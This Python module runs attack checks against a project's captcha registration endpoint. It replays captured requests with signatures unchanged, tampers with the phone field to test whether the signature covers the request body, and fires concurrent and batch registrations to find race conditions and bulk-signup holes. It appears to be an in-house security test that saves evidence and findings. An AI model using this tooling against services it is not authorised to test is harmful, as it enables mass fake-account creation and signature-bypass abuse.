# -*- coding: utf-8 -*-
"""A 项目注册接口攻击原语 —— 批量并发注册 / 线程阻塞 / 签名防重放检测。

攻击场景（确定性、无 LLM）：
  S1 原样回放 register_by_captcha（同 h_sign/h_nonce/h_ts）
     → 若 ret=0：签名无时效/无 nonce 防重放，报「签名可重放」漏洞
  S2 改 phone 不改 sign 回放
     → 若 ret=0：sign 未绑定 body，报「签名绕过」漏洞
  S3 同手机号 N 线程并发注册
     → 观测：耗时分布(判断是否串行/锁阻塞)、user_id 集合
       user_id 数>1 → 「重复账号」竞态漏洞；耗时≈串行 → 线程阻塞实锤
  S4 不同手机号批量并发注册（仅当 S2 签名可绕过时执行）

证据落盘：output/evidence_a_register/<场景>/ 请求+响应+执行元数据。
"""
from __future__ import annotations

import json
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from typing import Any

import requests

from tools.whistle_parser import WhistleParser

EVIDENCE_ROOT = Path("output") / "evidence_a_register"


def _load_register_entry(capture_dir: str, keyword: str = "register_by_captcha",
                         recent: int = 500):
    """从抓包目录找最新一条目标接口请求（Core 层 latest_first+粗筛，不卡大目录）。"""
    grouped = WhistleParser.find_endpoints(
        capture_dir, keywords=[keyword], max_files=recent, latest_first=True)
    for ep, entries in grouped.items():
        if keyword in ep:
            return sorted(entries, key=lambda e: e.timestamp or 0)[-1]
    return None


def _post(entry, body_raw: str, timeout: int = 30) -> dict:
    """用抓包原始头+原样 body 字节 POST；返回 {status, ret, body, cost_ms, error}"""
    url = entry.url if entry.url.startswith("http") else "https://" + entry.req_headers.get("host", "") + entry.endpoint
    t0 = time.perf_counter()
    try:
        r = requests.post(url, data=body_raw.encode("utf-8"),
                          headers={k: v for k, v in entry.req_headers.items()
                                   if k.lower() not in ("content-length", "accept-encoding", "connection", "proxy-authorization")},
                          timeout=timeout, verify=False)
        cost = (time.perf_counter() - t0) * 1000
        try:
            j = r.json()
        except Exception:
            j = {"_raw": r.text[:500]}
        return {"status": r.status_code, "ret": j.get("ret"), "body": j, "cost_ms": round(cost, 1)}
    except Exception as e:
        return {"status": None, "ret": None, "body": None,
                "cost_ms": round((time.perf_counter() - t0) * 1000, 1), "error": str(e)[:200]}


def _dump_evidence(scene: str, name: str, req_meta: dict, result: dict) -> str:
    d = EVIDENCE_ROOT / scene
    d.mkdir(parents=True, exist_ok=True)
    (d / f"{name}_request.json").write_text(json.dumps(req_meta, ensure_ascii=False, indent=2), encoding="utf-8")
    (d / f"{name}_response.json").write_text(json.dumps(result, ensure_ascii=False, indent=2, default=str), encoding="utf-8")
    return str(d / f"{name}_response.json")


def _set_phone(body_raw: str, phone: str) -> str:
    b = json.loads(body_raw)
    b["phone"] = phone
    return json.dumps(b, separators=(",", ":"), ensure_ascii=False)


def run(capture_dir: str, env_cfg=None, evidence_dir: str | None = None,
        concurrency: int = 10, phone: str = "66002") -> tuple[int, dict]:
    global EVIDENCE_ROOT
    if evidence_dir:
        EVIDENCE_ROOT = Path(evidence_dir)
    EVIDENCE_ROOT.mkdir(parents=True, exist_ok=True)

    entry = _load_register_entry(capture_dir)
    if entry is None:
        return 1, {"status": "ERROR", "error": f"抓包目录无 register_by_captcha: {capture_dir}"}

    base_body = entry.req_body_raw
    findings: list[dict] = []
    summary: dict[str, Any] = {"endpoint": entry.endpoint, "scenarios": {}}

    # ── S1 原样回放（签名防重放）────────────────────────────
    r1 = _post(entry, base_body)
    _dump_evidence("S1_replay", "replay", base_meta(base_body, entry), r1)
    s1_replayed = (r1.get("ret") == 0)
    summary["scenarios"]["S1_replay"] = {"ret": r1.get("ret"), "status": r1.get("status"),
                                          "cost_ms": r1.get("cost_ms"), "replayed": s1_replayed}
    if s1_replayed:
        findings.append({"id": "A-SEC-01", "severity": "high", "title": "签名可重放（h_sign 原样回放仍 ret=0）",
                         "evidence": "S1_replay"})

    # ── S2 改 phone 不改 sign（签名是否绑 body）─────────────
    tampered = _set_phone(base_body, "66099")
    r2 = _post(entry, tampered)
    _dump_evidence("S2_tamper_phone", "tamper", {"body": tampered, "note": "仅改 phone，sign/nonce/ts 不变"}, r2)
    s2_bypass = (r2.get("ret") == 0)
    summary["scenarios"]["S2_tamper_phone"] = {"ret": r2.get("ret"), "status": r2.get("status"),
                                                "bypass": s2_bypass, "resp": (r2.get("body") or {}) if isinstance(r2.get("body"), dict) else str(r2.get("body"))[:200]}
    if s2_bypass:
        findings.append({"id": "A-SEC-02", "severity": "critical", "title": "签名未绑定请求体（改 phone 后 sign 仍通过）",
                         "evidence": "S2_tamper_phone"})

    # ── S3 同手机号并发注册（唯一性竞态 + 线程阻塞）──────────
    same_phone_body = _set_phone(base_body, phone) if s2_bypass else base_body
    t0 = time.perf_counter()
    with ThreadPoolExecutor(max_workers=concurrency) as ex:
        results = list(ex.map(lambda _: _post(entry, same_phone_body), range(concurrency)))
    wall_ms = round((time.perf_counter() - t0) * 1000, 1)

    for i, r in enumerate(results):
        _dump_evidence("S3_concurrent_same_phone", f"req_{i:02d}", {"body": same_phone_body, "thread": i}, r)

    costs = sorted(r["cost_ms"] for r in results)
    ok = [r for r in results if r.get("ret") == 0]
    user_ids = {json.dumps((r.get("body") or {}).get("user_basic_info", {}) .get("user_id")) for r in ok}
    ret_dist: dict[str, int] = {}
    for r in results:
        ret_dist[str(r.get("ret"))] = ret_dist.get(str(r.get("ret")), 0) + 1
    serial_ms = sum(costs)
    # parallel_ratio = sum(单请求耗时)/墙钟：≈1 为全串行(锁阻塞)，≈N 为真并行
    ratio = round(serial_ms / wall_ms, 2) if wall_ms else 0
    summary["scenarios"]["S3_concurrent_same_phone"] = {
        "concurrency": concurrency, "wall_ms": wall_ms, "serial_sum_ms": round(serial_ms, 1),
        "parallel_ratio": ratio, "latency_min": costs[0], "latency_p50": costs[len(costs)//2],
        "latency_max": costs[-1], "ret_dist": ret_dist, "ok_count": len(ok),
        "distinct_user_ids": sorted(user_ids),
    }
    if len(user_ids) > 1:
        findings.append({"id": "A-SEC-03", "severity": "critical",
                         "title": f"同手机号并发注册产生 {len(user_ids)} 个不同 user_id（唯一性竞态）",
                         "evidence": "S3_concurrent_same_phone"})
    if ratio < 1.5:
        findings.append({"id": "A-PERF-01", "severity": "medium",
                         "title": f"注册接口疑似串行化处理（parallel_ratio={ratio}，≈1 为全串行）——线程阻塞实锤",
                         "evidence": "S3_concurrent_same_phone"})

    # ── S4 不同手机号批量并发（仅签名可绕过时）──────────────
    if s2_bypass:
        bodies = [_set_phone(base_body, f"66{100+i}") for i in range(concurrency)]
        t0 = time.perf_counter()
        with ThreadPoolExecutor(max_workers=concurrency) as ex:
            rs4 = list(ex.map(lambda b: _post(entry, b), bodies))
        wall4 = round((time.perf_counter() - t0) * 1000, 1)
        ok4 = [r for r in rs4 if r.get("ret") == 0]
        uid4 = {json.dumps((r.get("body") or {}).get("user_basic_info", {}).get("user_id")) for r in ok4}
        for i, r in enumerate(rs4):
            _dump_evidence("S4_batch_distinct_phone", f"req_{i:02d}", {"body": bodies[i]}, r)
        summary["scenarios"]["S4_batch_distinct_phone"] = {
            "concurrency": concurrency, "wall_ms": wall4, "ok_count": len(ok4),
            "distinct_user_ids": sorted(uid4),
            "ret_dist": {str(k): sum(1 for r in rs4 if str(r.get("ret")) == str(k)) for k in {r.get('ret') for r in rs4}},
        }
        if len(ok4) == concurrency:
            findings.append({"id": "A-SEC-04", "severity": "critical",
                             "title": f"批量注册 {concurrency}/{concurrency} 全部成功（无限频/无图形验证码/签名可批量伪造）",
                             "evidence": "S4_batch_distinct_phone"})

    summary["findings"] = findings
    summary["status"] = "FAIL" if any(f["severity"] == "critical" for f in findings) else (
        "WARN" if findings else "PASS")
    (EVIDENCE_ROOT / "attack_summary.json").write_text(
        json.dumps(summary, ensure_ascii=False, indent=2, default=str), encoding="utf-8")
    return (0 if summary["status"] == "PASS" else 2), summary


def base_meta(body_raw: str, entry) -> dict:
    return {"url": entry.url, "method": entry.method, "headers": entry.req_headers, "body": body_raw}
